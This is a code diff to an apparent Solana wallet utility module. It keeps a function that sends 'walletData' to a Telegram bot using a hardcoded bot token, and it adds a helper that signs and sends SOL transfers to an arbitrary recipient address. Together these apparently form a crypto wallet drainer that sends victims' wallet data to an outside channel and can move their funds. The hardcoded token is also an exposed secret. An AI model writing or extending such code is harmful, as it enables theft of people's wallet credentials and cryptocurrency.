@@ -1,5 +1,4 @@
-
-import { Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
 // WARNING: Storing credentials in code is not secure
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
@@ -58,6 +57,29 @@ export const sendToTelegram = async (walletData: any) => {
     return true;
   } catch (error) {
     console.error('Error sending to Telegram:', error);
+    throw error;
+  }
+};
+
+export const signAndSendTransaction = async (connection: Connection, wallet: any, recipientAddress: string, amount: number) => {
+  try {
+    const transaction = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: wallet.publicKey,
+        toPubkey: new PublicKey(recipientAddress),
+        lamports: amount * LAMPORTS_PER_SOL,
+      })
+    );
+
+    const signature = await sendAndConfirmTransaction(
+      connection,
+      transaction,
+      [wallet],
+    );
+
+    return signature;
+  } catch (error) {
+    console.error('Error in transaction:', error);
     throw error;
   }
 };
